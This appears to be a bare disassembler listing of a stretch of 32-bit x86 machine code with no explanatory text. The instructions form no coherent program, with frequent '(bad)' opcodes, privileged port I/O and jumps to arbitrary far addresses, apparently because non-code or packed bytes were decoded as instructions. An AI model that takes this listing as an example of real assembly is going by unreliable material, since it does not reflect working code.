  428fb7:	cmp    al,0x7f
  428fb9:	sub    BYTE PTR [ebx-0x4f1501c2],dh
  428fbf:	ss mov dh,0x43
  428fc2:	mov    ebx,0xfa9edb56
  428fc7:	sub    ebp,DWORD PTR [edi-0x13]
  428fca:	xor    bh,al
  428fcc:	and    al,0x97
  428fce:	ins    DWORD PTR es:[edi],dx
  428fcf:	or     BYTE PTR [eax],bl
  428fd1:	imul   ebx,DWORD PTR [ecx-0x55],0x3676b4b8
  428fd8:	sbb    cl,BYTE PTR [edi+0x6b]
  428fdb:	outs   dx,DWORD PTR ds:[esi]
  428fdc:	das    
  428fdd:	fidiv  WORD PTR [esp+esi*4+0x7a684857]
  428fe4:	test   BYTE PTR [edi-0x27],dl
  428fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fe8:	cs iret 
  428fea:	sar    DWORD PTR [esi],1
  428fec:	jge    0x429004
  428fee:	loopne 0x428fe2
  428ff0:	adc    eax,0xdcecc8f2
  428ff5:	xchg   ebp,eax
  428ff6:	xor    BYTE PTR [ebx-0x28],dh
  428ff9:	or     al,0xf7
  428ffb:	xchg   esi,eax
  428ffc:	and    eax,0xb1f220b4
  429001:	rcr    BYTE PTR [esi+0x1d],cl
  429004:	lds    edi,FWORD PTR [edx+edi*1+0x3c89aced]
  42900b:	or     ebx,DWORD PTR [esi]
  42900d:	cdq    
  42900e:	mov    ch,0x4d
  429010:	addr16 pushf 
  429012:	pop    esp
  429013:	jbe    0x42908e
  429015:	fild   QWORD PTR [ecx-0x34da7af9]
  42901b:	repz shl BYTE PTR [ecx],1
  42901e:	ins    DWORD PTR es:[edi],dx
  42901f:	cmp    ecx,DWORD PTR [edx]
  429021:	sub    ebx,edx
  429023:	dec    esp
  429024:	push   ss
  429025:	adc    BYTE PTR gs:[eax-0x31b699f8],al
  42902c:	push   ss
  42902d:	fdivr  QWORD PTR [edx]
  42902f:	push   ds
  429030:	jle    0x42901e
  429032:	mov    edx,0xbf4e20ad
  429037:	mov    bl,0xfc
  429039:	jmp    0x3375d4ee
  42903e:	pop    ecx
  42903f:	in     eax,dx
  429040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429041:	jb     0x429076
  429043:	icebp  
  429044:	lock push 0x918c07d
  42904a:	fild   DWORD PTR [edx]
  42904c:	test   eax,0x138c6b8a
  429051:	enter  0x23bb,0x52
  429055:	outs   dx,BYTE PTR ds:[esi]
  429056:	pop    esp
  429057:	mov    dh,0x93
  429059:	mov    al,ds:0x5b53f3e7
  42905e:	fild   WORD PTR ds:0xa69df916
  429064:	dec    edx
  429065:	lock and ah,ah
  429068:	sbb    al,0xe9
  42906a:	test   DWORD PTR [edi-0x2a],esi
  42906d:	pop    eax
  42906e:	mov    esi,0x4b1decbf
  429073:	inc    edi
  429074:	mov    DWORD PTR [eax],eax
  429076:	clc    
  429077:	vpmaddwd xmm4,xmm3,xmm3
  42907b:	xchg   esp,eax
  42907c:	cdq    
  42907d:	pop    es
  42907e:	loopne 0x429054
  429080:	jnp    0x429099
  429082:	xor    eax,DWORD PTR ss:[edx+0x5b]
  429086:	mov    ch,0x54
  429088:	adc    al,0xdb
  42908a:	and    DWORD PTR [ebx-0xc771edb],esp
  429090:	jl     0x4290fa
  429092:	mov    al,0x83
  429094:	push   ds
  429095:	dec    ecx
  429096:	outs   dx,BYTE PTR ds:[esi]
  429097:	nop
  429098:	xor    BYTE PTR [edi-0x615279d6],al
  42909e:	mov    BYTE PTR cs:[ebx+0x436c6aff],al
  4290a5:	pusha  
  4290a6:	add    DWORD PTR [ecx-0x4b3a556f],eax
  4290ac:	mov    ah,bl
  4290ae:	mov    ecx,esp
  4290b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290b1:	jne    0x429065
  4290b3:	mov    WORD PTR [edx],?
  4290b5:	out    dx,eax
  4290b6:	xchg   esp,eax
  4290b7:	jl     0x4290cc
  4290b9:	ss mov bl,0xe4
  4290bc:	dec    ebp
  4290bd:	int    0x93
  4290bf:	inc    esi
  4290c0:	xchg   bh,bl
  4290c2:	je     0x4290e6
  4290c4:	push   0x7922503c
  4290c9:	icebp  
  4290ca:	xor    al,0xa1
  4290cc:	push   ecx
  4290cd:	pop    edi
  4290ce:	mov    bl,0x14
  4290d0:	cmp    DWORD PTR [eax+0x5b79b11a],ebp
  4290d6:	ja     0x429073
  4290d8:	ss dec edx
  4290da:	mov    cl,0x2c
  4290dc:	jnp    0x429120
  4290de:	fptan  
  4290e0:	inc    esi
  4290e1:	test   al,0x7b
  4290e3:	mov    BYTE PTR ds:0xf129dd86,bh
  4290e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290ea:	in     al,0xb1
  4290ec:	not    al
  4290ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290ef:	das    
  4290f0:	iret   
  4290f1:	popf   
  4290f2:	xor    ebp,DWORD PTR [ebx+eiz*2+0x61]
  4290f6:	cmp    bl,BYTE PTR [eax+0x4be985e]
  4290fc:	xor    al,0x35
  4290fe:	pop    ds
  4290ff:	push   eax
  429100:	in     eax,dx
  429101:	stos   BYTE PTR es:[edi],al
  429102:	fwait
  429103:	xchg   edx,eax
  429104:	pop    edx
  429105:	fld    QWORD PTR [esi-0xe]
  429108:	sub    al,0xda
  42910a:	cmp    edi,esp
  42910c:	and    al,0x99
  42910e:	pop    edx
  42910f:	mov    dh,0x83
  429111:	inc    edi
  429112:	stc    
  429113:	push   ebx
  429114:	cmp    al,0xdd
  429116:	fistp  DWORD PTR [esi+0x16298feb]
  42911c:	loope  0x4290cd
  42911e:	call   0xf246:0x1f194bee
  429125:	pop    ebx
  429126:	and    dh,BYTE PTR [di+0x46ba]
  42912b:	ins    DWORD PTR es:[edi],dx
  42912c:	(bad)  
  42912d:	or     edx,esp
  42912f:	frstor [eax]
  429131:	shl    DWORD PTR [ebx],0xd1
  429134:	jne    0x429134
  429136:	mov    esp,0xb86e76c6
  42913b:	fs pop ebx
  42913d:	sub    eax,DWORD PTR [edi-0x49]
  429140:	test   dh,0xf8
  429143:	pop    ebp
  429144:	lahf   
  429145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429146:	add    BYTE PTR [ebx],0xdd
  429149:	repz arpl WORD PTR [ecx+eiz*1],bp
  42914d:	fnstenv [eax+0x73472c8b]
  429153:	pop    eax
  429154:	lahf   
  429155:	jge    0x4291a4
  429157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429158:	cmp    al,0xa1
  42915a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42915b:	mov    ds:0xc9a58ff1,eax
  429160:	push   ds
  429161:	cmp    DWORD PTR [ebx],ebx
  429163:	mov    ds:0xd2992ec7,al
  429168:	pop    fs
  42916a:	imul   ebx,DWORD PTR [esi+ebp*2+0x6392b261],0x39
  429172:	push   0x39
  429174:	shl    ecx,1
  429176:	mov    ah,0xb4
  429178:	in     eax,dx
  429179:	paddw  mm0,mm3
  42917c:	mov    ch,0x35
  42917e:	jg     0x42916e
  429180:	or     edx,DWORD PTR [edi-0x36e90573]
  429186:	aaa    
  429187:	int3   
  429188:	iret   
  429189:	dec    esi
  42918a:	in     eax,0xbb
  42918c:	icebp  
  42918d:	int3   
  42918e:	imul   ebp,DWORD PTR [ebp+0x1f],0xffffffa5
  429192:	gs cmp al,0x23
  429195:	inc    edi
  429196:	add    DWORD PTR ds:0x3f56d925,esi
  42919c:	pop    ebp
  42919d:	sub    ch,al
  42919f:	dec    ebx
  4291a0:	sub    eax,0xd5d5b2c1
  4291a5:	sti    
  4291a6:	push   eax
  4291a7:	out    dx,al
  4291a8:	out    0xf8,al
  4291aa:	adc    al,0x3f
  4291ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4291ad:	in     eax,dx
  4291ae:	push   cs
  4291af:	cmp    DWORD PTR [ebp+0x6ef118c9],esp
  4291b5:	xchg   ecx,eax
  4291b6:	mov    ah,0xf9
  4291b8:	imul   ebp,ebx,0xfe51dd59
  4291be:	frndint 
  4291c0:	cmc    
  4291c1:	mov    al,ds:0xa490a391
  4291c6:	jmp    0x429239
  4291c8:	lds    ecx,FWORD PTR [ebp+0x10]
  4291cb:	mov    dh,0xcf
  4291cd:	adc    eax,0xf6fa56e9
  4291d2:	mov    bh,0xf4
  4291d4:	cmp    al,0x10
  4291d6:	push   0xffffffb7
  4291d8:	inc    ebp
  4291d9:	mov    ah,0xbd
  4291db:	lock dec esp
  4291dd:	xor    esp,DWORD PTR [edi+0x45]
  4291e0:	sbb    BYTE PTR [ecx],ch
  4291e2:	popf   
  4291e3:	ds xchg edi,eax
  4291e5:	mov    al,0x86
  4291e7:	xor    al,0x6e
  4291e9:	(bad)  
  4291ea:	dec    ebx
  4291eb:	ins    BYTE PTR es:[edi],dx
  4291ec:	mov    ds:0x1a244bb3,eax
  4291f1:	sbb    eax,0xa9212ce1
  4291f6:	mov    bh,0x77
  4291f8:	mov    BYTE PTR [esi-0x21],al
  4291fb:	clc    
  4291fc:	repz mov ds:0xafed818b,al
  429202:	adc    al,dl
  429204:	sub    dh,dl
  429206:	jmp    0x42921e
  429208:	cli    
  429209:	sub    al,0x3c
  42920b:	lock and DWORD PTR [ebx+0x5e126943],0x5d477eb2
  429216:	pop    ebp
  429217:	push   ds
  429218:	jp     0x429205
  42921a:	paddq  mm1,QWORD PTR [ebx-0x6cff2c65]
  429221:	ja     0x429207
  429223:	xchg   esp,eax
  429224:	pop    eax
  429225:	ss mov ah,0x24
  429228:	in     eax,0x83
  42922a:	(bad)  
  42922b:	xchg   ebp,eax
  42922c:	pop    ecx
  42922d:	add    DWORD PTR ds:0xe1abe175,esi
  429233:	adc    al,0x9b
  429235:	xchg   edx,eax
  429236:	xlat   BYTE PTR ds:[ebx]
  429237:	arpl   WORD PTR [edi-0x7],dx
  42923a:	daa    
  42923b:	cmp    eax,edi
  42923d:	mov    al,ds:0xe7bd190e
  429242:	mov    ebp,0xaba82e90
  429247:	in     al,dx
  429248:	aaa    
  429249:	clc    
  42924a:	lods   eax,DWORD PTR ds:[esi]
  42924b:	xchg   esi,eax
  42924c:	xor    eax,0x59c8d7ec
  429251:	and    esi,DWORD PTR [ebp+0x4cfc484]
  429257:	push   ss
  429258:	in     eax,0x4a
  42925a:	fldz   
  42925c:	sbb    al,0x62
  42925e:	ficom  DWORD PTR ds:0x6f48dd8
  429264:	mov    dh,0x13
  429266:	mov    ch,BYTE PTR [eax]
  429268:	push   ds
  429269:	icebp  
  42926a:	add    esp,edx
  42926c:	bound  ebx,QWORD PTR [edi+0x14613ab]
  429272:	sub    al,0x7e
  429274:	adc    BYTE PTR [esi],0xd6
  429277:	mov    esi,0x445d9a92
  42927c:	sbb    DWORD PTR [ecx+0x4873f771],ebx
  429282:	test   al,0x17
  429284:	adc    eax,0x96e52f51
  429289:	nop
  42928a:	pop    es
  42928b:	or     edx,DWORD PTR [edi]
  42928d:	jns    0x42925c
  42928f:	cli    
  429290:	push   0x1
  429292:	mov    bl,0xb
  429294:	les    ebx,FWORD PTR ds:[edx+0x357eda00]
  42929b:	mov    dl,0xe8
  42929d:	adc    DWORD PTR [ecx],esp
  42929f:	in     al,dx
  4292a0:	test   eax,0xe357304e
  4292a5:	out    0xb2,al
  4292a7:	test   BYTE PTR [ecx-0x79070d64],bh
  4292ad:	mov    ebp,0xa6e661fd
  4292b2:	mov    edi,0x537303ae
  4292b7:	call   0x5694:0xc4bca144
  4292be:	aad    0x8f
  4292c0:	(bad)  
  4292c1:	xchg   ebx,eax
  4292c2:	int    0x1d
  4292c4:	sahf   
  4292c5:	ficom  WORD PTR [eax]
  4292c7:	push   ecx
  4292c8:	sbb    ah,0xb9
  4292cb:	ffree  st(4)
  4292cd:	lds    esi,FWORD PTR [ebp-0x455efe5c]
  4292d3:	jmp    0xe8fcdded
  4292d8:	popf   
  4292d9:	arpl   WORD PTR [eax],bp
  4292db:	add    dl,dh
  4292dd:	cmp    al,0xcf
  4292df:	xor    eax,0x2d90f346
  4292e4:	imul   eax,ebp,0xffffffd7
  4292e7:	sbb    DWORD PTR [ecx-0x41db4adb],0xffffffa1
  4292ee:	jnp    0x429300
  4292f0:	frstor [ebp+0x1b]
  4292f3:	push   edi
  4292f4:	int3   
  4292f5:	or     al,0xb4
  4292f7:	cwde   
  4292f8:	loope  0x42928d
  4292fa:	lds    edx,FWORD PTR [esi+eax*4+0x7c]
  4292fe:	dec    ecx
  4292ff:	dec    ecx
  429300:	ds or  eax,0x8bfc83bc
  429306:	push   ecx
  429307:	jne    0x429383
  429309:	mov    eax,0x291be8a0
  42930e:	aas    
  42930f:	xchg   edx,eax
  429310:	or     BYTE PTR [ebp+0xe],dl
  429313:	dec    ebp
  429314:	mov    dh,0xa7
  429316:	sti    
  429317:	cmp    BYTE PTR [ecx],cl
  429319:	sub    bl,BYTE PTR [esi+0x40]
  42931c:	and    al,0x28
  42931e:	outs   dx,BYTE PTR ds:[esi]
  42931f:	das    
  429320:	pop    esi
  429321:	test   al,0xb9
  429323:	aam    0x4c
  429325:	cwde   
  429326:	sub    ebx,DWORD PTR [edx-0x18dfeadb]
  42932c:	aad    0xe0
  42932e:	shr    DWORD PTR [esi+0x5],cl
  429331:	dec    ebx
  429332:	mov    ah,0xcf
  429334:	sbb    BYTE PTR [ebp-0x1f],dl
  429337:	sbb    eax,0xe1f22d34
  42933c:	mov    ax,ds:0x1f4e016a
  429342:	add    edi,0xc
  429345:	iret   
  429346:	xchg   edi,eax
  429347:	out    dx,eax
  429348:	ficomp DWORD PTR [ebp+edi*4+0x14]
  42934c:	add    al,0x35
  42934e:	sub    edx,ebx
  429350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429351:	cdq    
  429352:	int    0xe7
  429354:	mov    ebp,0x21bc1289
  429359:	fnstcw WORD PTR [ebp-0x4c]
  42935c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42935d:	imul   ecx,ebx,0xffffffa9
  429360:	dec    esp
  429361:	fwait
  429362:	retf   
  429363:	mov    edx,0x1b97b9d1
  429368:	mov    ebp,0x345f1cda
  42936d:	and    edi,DWORD PTR [ebp+0x145d1444]
  429373:	add    BYTE PTR [ebp-0x420eaf1c],0xb6
  42937a:	and    BYTE PTR [ebp-0x7f7c5de1],cl
  429380:	fnstcw WORD PTR [edx-0x60]
  429383:	and    eax,0xec743453
  429388:	or     al,0xa0
  42938a:	fld    TBYTE PTR [edi+0x213f0459]
  429390:	or     al,0x89
  429392:	fdivr  QWORD PTR [ebx+edx*4]
  429395:	sub    DWORD PTR [edi+0x407e7964],edi
  42939b:	xor    esp,DWORD PTR [esi]
  42939d:	cwde   
  42939e:	and    al,0x16
  4293a0:	ret    0x664f
  4293a3:	fstp   QWORD PTR [ebx]
  4293a5:	jecxz  0x4293f0
  4293a7:	and    cl,BYTE PTR [ecx+ecx*1+0x43326fc4]
  4293ae:	push   ebx
  4293af:	addr16 dec ebp
  4293b1:	cli    
  4293b2:	mov    eax,0x11f385d8
  4293b7:	out    0x5c,eax
  4293b9:	xchg   ebp,eax
  4293ba:	mov    bl,al
  4293bc:	in     eax,dx
  4293bd:	pusha  
  4293be:	fmul   QWORD PTR [edx-0x66]
  4293c1:	mov    cl,0xb2
  4293c3:	xchg   esp,eax
  4293c4:	add    edi,ebp
  4293c6:	fsub   DWORD PTR fs:[ebp+0x6af104c4]
  4293cd:	int    0x68
  4293cf:	mov    ch,0x1f
  4293d1:	pop    ecx
  4293d2:	mul    DWORD PTR ds:[ecx+0x66]
  4293d6:	cld    
  4293d7:	pop    edi
  4293d8:	ret    
  4293d9:	mov    ds:0xb9b7025b,al
  4293de:	xlat   BYTE PTR ds:[ebx]
  4293df:	popa   
  4293e0:	mov    al,ds:0x83fed90
  4293e5:	mov    dh,0xb6
  4293e7:	hlt    
  4293e8:	cli    
  4293e9:	jns    0x42945e
  4293eb:	int3   
  4293ec:	and    eax,0x43e672c0
  4293f1:	loope  0x429457
  4293f3:	jae    0x429415
  4293f5:	cdq    
  4293f6:	call   FWORD PTR [esi]
  4293f8:	add    eax,0x846019b
  4293fd:	sbb    eax,0xa75a6b6d
  429402:	pop    esi
  429403:	cmp    esp,eax
  429405:	sub    BYTE PTR [eax+0x5],0xb
  429409:	mov    bh,0x4a
  42940b:	mov    ch,0x33
  42940d:	call   0x8ffb:0xc44d25bb
  429414:	and    BYTE PTR [ecx],cl
  429416:	stc    
  429417:	xchg   edx,eax
  429418:	adc    ebp,DWORD PTR [ebx+0x2b]
  42941b:	dec    eax
  42941c:	loope  0x429421
  42941e:	jge    0x429408
  429420:	enter  0xcba4,0x30
  429424:	in     eax,0x8d
  429426:	stos   DWORD PTR es:[edi],eax
  429427:	sbb    esp,DWORD PTR [ecx+ebx*1]
  42942a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42942b:	xor    BYTE PTR [edi+0x31deb2e6],dh
  429431:	sbb    BYTE PTR [ebx-0x5a],0xb5
  429435:	dec    ecx
  429436:	in     al,0xed
  429438:	jmp    0x4293fd
  42943a:	rcl    ebp,1
  42943c:	fstp   DWORD PTR [ebp-0x4a4a8d6d]
  429442:	mov    ah,0xf3
  429444:	sub    BYTE PTR [edx-0x275ab441],cl
  42944a:	(bad)  
  42944b:	out    0xa5,al
  42944d:	pop    ebx
  42944e:	stc    
  42944f:	pop    ds
  429450:	sub    ebx,ecx
  429452:	cli    
  429453:	mov    DWORD PTR [esi],0x25de2f71
  429459:	cmp    BYTE PTR [ecx-0x77d9b639],0xa0
  429460:	aas    
  429461:	add    DWORD PTR [edi-0xd713f44],esi
  429467:	jne    0x42941f
  429469:	and    BYTE PTR [ecx+0x1d48ab64],dh
  42946f:	mov    ah,0x45
  429471:	cwde   
  429472:	or     al,0xef
  429474:	lds    ebp,FWORD PTR [ebx]
  429476:	mov    bl,0x3
  429478:	pop    ds
  429479:	pop    ecx
  42947a:	push   ebx
  42947b:	aad    0xec
  42947d:	pop    ebp
  42947e:	or     DWORD PTR [ecx+0xb369fd3],eax
  429484:	and    eax,0xccf307e4
  429489:	cmp    edi,edi
  42948b:	aaa    
  42948c:	pop    ds
  42948d:	leave  
  42948e:	in     eax,0x5f
  429490:	and    cl,dl
  429492:	nop
  429493:	mov    al,ds:0x69fb9a36
  429498:	loope  0x429507
  42949a:	mov    edx,0x919436f9
  42949f:	retf   0x4bdf
  4294a2:	adc    al,0x76
  4294a4:	div    BYTE PTR [esi-0x56d54b4e]
  4294aa:	fwait
  4294ab:	rcl    edi,cl
  4294ad:	jne    0x42944b
  4294af:	in     al,0xc7
  4294b1:	and    al,0x5a
  4294b3:	or     ecx,DWORD PTR [eax+0x6b8ecc09]
  4294b9:	aas    
  4294ba:	mov    eax,DWORD PTR [esi+0x37298f1a]
  4294c0:	sbb    DWORD PTR [ebx-0x289da505],0x1b88180e
  4294ca:	jg     0x42945f
  4294cc:	fidivr DWORD PTR [ecx+esi*8+0x55]
  4294d0:	imul   ecx,DWORD PTR [eax+0x34e58307],0x4bfcec57
  4294da:	dec    edx
  4294db:	fwait
  4294dc:	lds    edi,FWORD PTR [ebx-0xaf011b0]
  4294e2:	pop    ds
  4294e3:	adc    al,bh
  4294e5:	test   eax,0xa00efb2f
  4294ea:	or     esp,DWORD PTR [esi+ebp*2-0xa2a3d3b]
  4294f1:	add    esi,ebp
  4294f3:	repnz and edx,edi
  4294f6:	fcomip st,st(3)
  4294f8:	ret    
  4294f9:	dec    esp
  4294fa:	dec    edx
  4294fb:	add    al,0x77
  4294fd:	push   ebx
  4294fe:	je     0x429553
  429500:	dec    ebp
  429501:	lea    esi,[eax-0x646262dc]
  429507:	ins    BYTE PTR es:[edi],dx
  429508:	sti    
  429509:	add    DWORD PTR [eax],ebp
  42950b:	jb     0x429560
  42950d:	pop    ss
  42950e:	mov    fs,WORD PTR [ebp+0x1f]
  429511:	mov    DWORD PTR [edi-0x2c],edx
  429514:	fstp   TBYTE PTR [ecx-0x4e]
  429517:	xchg   ecx,eax
  429518:	adc    DWORD PTR [ebx],ebx
  42951a:	fistp  WORD PTR [esi+ebx*1]
  42951d:	dec    ecx
  42951e:	lock hlt 
  429520:	inc    ebp
  429521:	jl     0x429523
  429523:	dec    esp
  429524:	and    bh,BYTE PTR [ecx]
  429526:	adc    eax,0x1de7d426
  42952b:	sar    BYTE PTR [edx-0x5a],1
  42952e:	cmp    ecx,DWORD PTR [eax+0x759c033b]
  429534:	and    ebx,edx
  429536:	and    BYTE PTR [ebx],dh
  429538:	mov    dl,BYTE PTR [esi]
  42953a:	mov    cl,0xf4
  42953c:	sub    bh,ah
  42953e:	imul   ebp,DWORD PTR [esi+0x36f176f6],0x51
  429545:	xchg   esp,eax
  429546:	or     al,0x96
  429548:	sbb    eax,0xcaffb42b
  42954d:	xor    edi,DWORD PTR [ecx-0x53300ebf]
  429553:	aad    0x6f
  429555:	mov    ds:0xa5ceeb5a,al
  42955a:	or     esp,DWORD PTR [edx-0x66]
  42955d:	mov    ch,0xc7
  42955f:	stos   DWORD PTR es:[edi],eax
  429560:	xchg   ecx,eax
  429561:	jmp    0x4295e1
  429563:	add    edi,DWORD PTR [ebp+esi*4-0x6d]
  429567:	js     0x4295de
  429569:	scas   eax,DWORD PTR es:[edi]
  42956a:	pop    esp
  42956b:	push   esp
  42956c:	and    BYTE PTR [ecx+ebx*2-0x15],bl
  429570:	add    eax,0xbaead34c
  429575:	test   DWORD PTR [ecx*8-0x46b20630],ebp
  42957c:	push   ebp
  42957d:	in     al,0xc8
  42957f:	mov    eax,0xdd3fa587
  429584:	push   cs
  429585:	aas    
  429586:	mov    edx,0x13798eab
  42958b:	mov    esp,0x3a38b6f2
  429590:	pop    eax
  429591:	pop    ebx
  429592:	mov    ebp,0xbad736b3
  429597:	rcr    BYTE PTR [edx],cl
  429599:	mov    esi,esp
  42959b:	aad    0xc5
  42959d:	shl    BYTE PTR [edx+ebx*8+0x1d],1
  4295a1:	mov    ecx,0xcadc53
  4295a6:	ficomp DWORD PTR [ecx+0x16fba364]
  4295ac:	inc    edi
  4295ad:	stos   DWORD PTR es:[edi],eax
  4295ae:	mov    dh,0x86
  4295b0:	inc    ebx
  4295b1:	jbe    0x429566
  4295b3:	cmc    
  4295b4:	sbb    ecx,ebx
  4295b6:	nop
  4295b7:	or     al,0x58
  4295b9:	xor    dl,BYTE PTR ds:0x92aa5a71
  4295bf:	mov    WORD PTR [ebp-0x5b],ds
  4295c2:	pop    ebx
  4295c3:	jno    0x42955a
  4295c5:	or     ecx,DWORD PTR [ebp+0x27]
  4295c8:	sub    DWORD PTR [ebp+ebx*1-0x4c273b88],ebp
  4295cf:	inc    esp
  4295d0:	jnp    0x4295c2
  4295d2:	pushf  
  4295d3:	pop    ebx
  4295d4:	ja     0x429627
  4295d6:	ins    DWORD PTR es:[edi],dx
  4295d7:	xlat   BYTE PTR ds:[ebx]
  4295d8:	leave  
  4295d9:	or     eax,0x6421f0fd
  4295de:	mov    eax,0xb4154b85
  4295e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295e4:	sub    DWORD PTR [edi-0x32],esp
  4295e7:	mov    edi,esp
  4295e9:	xchg   esp,eax
  4295ea:	popf   
  4295eb:	int    0x65
  4295ed:	outs   dx,WORD PTR ds:[esi]
  4295ef:	out    dx,eax
  4295f0:	or     cl,0x62
  4295f3:	cmc    
  4295f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295f5:	jns    0x429612
  4295f7:	xchg   ebx,eax
  4295f8:	ror    ch,1
  4295fa:	xor    ecx,DWORD PTR [ebp-0x69]
  4295fd:	and    bl,BYTE PTR [ebx+0x7ba78c18]
  429603:	pop    esp
  429604:	dec    edi
  429605:	ss push edx
  429607:	or     al,0x64
  429609:	(bad)  
  42960a:	stc    
  42960b:	inc    esi
  42960c:	or     al,0x97
  42960e:	mov    eax,0x78446a34
  429613:	xor    eax,0xed72bca5
  429618:	adc    BYTE PTR [edi],ch
  42961a:	addr16 mov al,ds:0x4a1
  42961e:	jg     0x42966e
  429620:	and    eax,esi
  429622:	mov    bl,0x54
  429624:	xchg   ecx,eax
  429625:	retf   
  429626:	mov    esp,0xcbad152a
  42962b:	repz mov ds:0x1d92902d,al
  429631:	or     DWORD PTR [ebx],esi
  429633:	add    al,0xa5
  429635:	sub    al,0xe1
  429637:	or     al,0xc1
  429639:	fwait
  42963a:	jmp    0x42968f
  42963c:	cmp    eax,0x6494d894
  429641:	cmp    edx,DWORD PTR [ebx]
  429643:	es jle 0x4296b3
  429646:	mov    dl,0xc4
  429648:	or     edx,DWORD PTR [edx+0x18]
  42964b:	fwait
  42964c:	in     eax,0x5d
  42964e:	jge    0x42963a
  429650:	jg     0x429637
  429652:	xor    BYTE PTR [esi],cl
  429654:	sbb    al,0xb9
  429656:	aad    0xd7
  429658:	pop    eax
  429659:	icebp  
  42965a:	or     al,0x65
  42965c:	pop    ds
  42965d:	mov    ds:0xe593402b,eax
  429662:	es jl  0x4296ac
  429665:	xchg   edx,eax
  429666:	scas   eax,DWORD PTR es:[edi]
  429667:	out    0x6f,eax
  429669:	add    ah,ch
  42966b:	je     0x42963d
  42966d:	imul   eax,esi,0x45
  429670:	cmc    
  429671:	push   0xffffffb8
  429673:	and    BYTE PTR [esi-0x74239dc4],al
  429679:	psrlq  mm2,mm4
  42967c:	dec    ecx
  42967d:	cmc    
  42967e:	hlt    
  42967f:	out    0x5e,al
  429681:	aaa    
  429682:	mov    ch,0x22
  429684:	jecxz  0x429674
  429686:	clc    
  429687:	sub    esp,esi
  429689:	out    0xca,eax
  42968b:	retf   0xa3b7
  42968e:	shr    ecx,1
  429690:	aas    
  429691:	popf   
  429692:	jnp    0x4296a0
  429694:	mov    eax,ds:0xa97c1108
  429699:	(bad)  
  42969a:	jne    0x4296f4
  42969c:	outs   dx,DWORD PTR ds:[esi]
  42969d:	rcl    BYTE PTR [ebx+0x28],1
  4296a0:	test   BYTE PTR [edi+0x286f39f7],al
  4296a6:	pop    ebx
  4296a7:	jmp    0x70a1:0xe6048fd5
  4296ae:	repz (bad) 
  4296b0:	and    BYTE PTR [ecx],bh
  4296b2:	(bad)  
  4296b3:	push   ebx
  4296b4:	aaa    
  4296b5:	adc    eax,0xba15a336
  4296ba:	mov    ebx,0xa7cc3349
  4296bf:	add    DWORD PTR [esi],ebx
  4296c1:	imul   ecx
  4296c3:	call   FWORD PTR [edx]
  4296c5:	cmp    DWORD PTR [edi+esi*1-0x28f84ef4],edi
  4296cc:	stos   DWORD PTR es:[edi],eax
  4296cd:	xchg   DWORD PTR [ebp+0x43a87a42],edi
  4296d3:	jno    0x429735
  4296d5:	fldenv [eax+eiz*1]
  4296d8:	out    dx,al
  4296d9:	cli    
  4296da:	adc    eax,0xf4391cec
  4296df:	dec    eax
  4296e0:	(bad)  
  4296e2:	jl     0x429676
  4296e4:	mov    bh,0xab
  4296e6:	(bad)  
  4296e7:	mov    ebx,0xced168af
  4296ec:	sub    eax,0x7f9de591
  4296f1:	jns    0x429681
  4296f3:	cld    
  4296f4:	mov    bh,0xb0
  4296f6:	and    al,0xe7
  4296f8:	cli    
  4296f9:	retf   0x6495
  4296fc:	call   DWORD PTR [ebp+0x523e676]
  429702:	vshufpd ymm5,ymm3,YMMWORD PTR [eax-0x72e50d85],0xc0
  42970b:	mov    DWORD PTR [ecx+0x3a],edx
  42970e:	iret   
  42970f:	aas    
  429710:	clc    
  429711:	xchg   ebp,eax
  429712:	sub    dl,BYTE PTR ds:0x91ffc11e
  429718:	sti    
  429719:	mov    ds:0xe4f1c315,eax
  42971e:	sub    edx,DWORD PTR [ecx]
  429720:	hlt    
  429721:	stc    
  429722:	sbb    DWORD PTR [ebp+0x1c89f1ae],0xaeb09eea
  42972c:	pop    esp
  42972d:	je     0x4296e9
  42972f:	xchg   esp,eax
  429730:	sub    eax,0xe566bc1a
  429735:	pop    ecx
  429736:	inc    ecx
  429737:	out    dx,eax
  429738:	out    dx,eax
  429739:	fnsave [edx+0x9391aa7]
  42973f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429740:	clc    
  429741:	bnd jb 0x429760
  429744:	and    eax,0x2a160ba6
  429749:	add    BYTE PTR [edx],bl
  42974b:	test   BYTE PTR [bx+di-0x52],0xb
  429750:	rcl    BYTE PTR [ebp-0x4a],cl
  429753:	adc    al,0xea
  429755:	jno    0x429751
  429757:	hlt    
  429758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429759:	(bad)  
  42975b:	in     eax,0x4d
  42975d:	or     esi,edx
  42975f:	pop    ss
  429760:	nop
  429761:	pop    ecx
  429762:	lea    ecx,[esi+0x492383e0]
  429768:	jae    0x429736
  42976a:	mov    esi,0x293356fa
  42976f:	pop    edi
  429770:	mov    edi,0x6bb280a8
  429775:	(bad)  
  429776:	cmp    BYTE PTR [eax+0x74b14b5b],cl
  42977c:	mov    ecx,0x35a3da64
  429781:	mov    ds:0x26f9ea37,al
  429786:	push   edi
  429787:	(bad)  [edx]
  429789:	cwde   
  42978a:	stos   BYTE PTR es:[edi],al
  42978b:	cmp    bl,BYTE PTR [esi-0x221a9943]
  429791:	push   eax
  429792:	xor    dl,dh
  429794:	(bad)  
  429795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429796:	or     esp,DWORD PTR [esi-0x649d7fb3]
  42979c:	repz test DWORD PTR [eax],ecx
  42979f:	mov    edi,fs
  4297a1:	add    ah,dl
  4297a3:	mov    ah,0xe8
  4297a5:	and    BYTE PTR [edi-0x43135f1],al
  4297ab:	loop   0x429788
  4297ad:	xor    DWORD PTR [ebp+0x3a],eax
